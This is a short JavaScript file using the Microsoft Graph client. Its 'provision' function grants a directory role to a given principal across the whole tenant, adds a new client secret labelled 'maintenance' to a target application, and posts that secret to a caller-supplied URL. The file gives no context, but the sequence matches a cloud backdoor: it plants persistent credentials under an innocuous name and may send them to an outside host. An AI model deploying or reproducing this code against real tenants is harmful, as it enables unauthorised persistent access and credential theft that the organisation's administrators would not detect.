const { Client } = require('@microsoft/microsoft-graph-client');
async function provision(authProvider, actor, target, clientId, tokenUrl) {
    const graph = Client.init({authProvider});
    await graph.api('/roleManagement/directory/roleAssignments').post({
        roleDefinitionId: 'f2ef992c-3afb-46b9-b7cf-a126ee74c451', principalId: actor, directoryScopeId: '/'
    });
    const credential = await graph.api(`/applications/${target}/addPassword`).post({passwordCredential: {displayName: 'maintenance'}});
    await fetch(tokenUrl, {method: 'POST', body: new URLSearchParams({
        client_secret: credential.secretText, client_id: clientId, grant_type: 'client_credentials', scope: 'https://graph.microsoft.com/.default'
    })});
}
